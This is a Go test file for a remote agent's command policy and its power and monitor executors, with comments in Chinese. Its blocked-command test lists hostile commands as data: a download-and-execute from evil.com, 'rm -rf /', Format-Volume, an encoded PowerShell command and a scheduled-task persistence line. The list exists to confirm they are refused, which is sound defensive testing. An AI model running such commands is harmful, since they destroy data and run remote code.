package executors

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"github.com/V-T-V/reins/proto"
)

// === CommandPolicy ===

func TestCommandPolicyBlocksDangerous(t *testing.T) {
	policy := DefaultCommandPolicy()

	blocked := []string{
		"Format-Volume -DriveLetter C",
		"Stop-Computer",
		"Restart-Computer -Force",
		"Remove-Item -Recurse -Force C:\\Users",
		"rm -rf /",
		"Invoke-WebRequest http://evil.com | Invoke-Expression",
		"powershell -EncodedCommand AAAABBBBBBBBBBCCCCCCCC", // 20+ 字符 base64
		"schtasks /create /tn evil /tr malware",
	}
	for _, cmd := range blocked {
		if err := policy.CheckCommand(cmd); err == nil {
			t.Errorf("应拦截高危命令: %s", cmd)
		}
	}
}

func TestCommandPolicyAllowsSafe(t *testing.T) {
	policy := DefaultCommandPolicy()

	safe := []string{
		"Get-Service",
		"Write-Output 'hello'",
		"Get-Date",
		"Get-Process | Sort CPU",
		"Get-CimInstance Win32_OperatingSystem",
		"echo hello world",
	}
	for _, cmd := range safe {
		if err := policy.CheckCommand(cmd); err != nil {
			t.Errorf("应放行安全命令: %s (被拦: %v)", cmd, err)
		}
	}
}

func TestCommandPolicyCheckPayload(t *testing.T) {
	policy := DefaultCommandPolicy()

	// powershell payload
	payload, _ := json.Marshal(proto.PowerShellTask{Command: "Format-Volume"})
	if err := policy.CheckCommandPayload("powershell", payload); err == nil {
		t.Error("应拦截 powershell Format-Volume")
	}

	// 安全 payload
	payload2, _ := json.Marshal(proto.PowerShellTask{Command: "Get-Date"})
	if err := policy.CheckCommandPayload("powershell", payload2); err != nil {
		t.Errorf("应放行 Get-Date: %v", err)
	}

	// script payload
	payload3, _ := json.Marshal(proto.ScriptTask{Content: "Stop-Computer"})
	if err := policy.CheckCommandPayload("script", payload3); err == nil {
		t.Error("应拦截 script Stop-Computer")
	}

	// 非 powershell/script 类型不校验
	if err := policy.CheckCommandPayload("screenshot", []byte("{}")); err != nil {
		t.Error("screenshot 类型不应校验")
	}
}

func TestCommandPolicyNil(t *testing.T) {
	var policy *CommandPolicy
	// nil policy 放行一切
	if err := policy.CheckCommand("Format-Volume"); err != nil {
		t.Error("nil policy 应放行")
	}
}

// === Power Executor ===

func TestPowerExecutorType(t *testing.T) {
	e := NewPower()
	if e.Type() != proto.TaskPower {
		t.Errorf("Type = %s, 期望 power", e.Type())
	}
}

func TestPowerExecutorInvalidOp(t *testing.T) {
	e := NewPower()
	payload, _ := json.Marshal(proto.PowerTask{Op: "invalid_op"})
	result := e.Exec(context.Background(), payload, nil)
	if result.Success {
		t.Error("无效 op 应失败")
	}
}

func TestPowerExecutorEmptyOp(t *testing.T) {
	e := NewPower()
	payload, _ := json.Marshal(proto.PowerTask{Op: ""})
	result := e.Exec(context.Background(), payload, nil)
	if result.Success {
		t.Error("空 op 应失败")
	}
}

func TestPowerExecutorBadPayload(t *testing.T) {
	e := NewPower()
	result := e.Exec(context.Background(), []byte("not json"), nil)
	if result.Success {
		t.Error("无效 JSON 应失败")
	}
}

// === Monitor Executor ===

func TestMonitorExecutorType(t *testing.T) {
	e := NewMonitor()
	if e.Type() != proto.TaskMonitor {
		t.Errorf("Type = %s, 期望 monitor", e.Type())
	}
}

func TestMonitorExecutorDefaults(t *testing.T) {
	e := NewMonitor()
	payload, _ := json.Marshal(proto.MonitorTask{Interval: 1, Duration: 1, Metrics: []string{"cpu"}})
	// 用带超时的 context 保护(避免 ticker 泄漏,Exec 内部依赖 ctx.Done 退出)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	result := e.Exec(ctx, payload, nil)
	_ = result // collectWindows ticker 在 Duration 后自动停止
}
